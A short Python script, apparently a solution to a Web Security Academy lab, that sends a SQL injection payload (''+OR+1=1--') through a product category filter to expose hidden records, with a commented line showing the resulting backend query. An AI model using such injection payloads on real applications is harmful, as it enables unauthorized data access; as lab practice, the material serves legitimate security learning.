import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac721fae1ee55615c06767d5007f0058.web-security-academy.net'

def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    print(soup)

# try_category("""Gifts""")
# try_category("""SELECT * FROM products WHERE category = 'Gifts' OR 1=1 -- ' AND released = 1""")
try_category("""'+OR+1=1--""")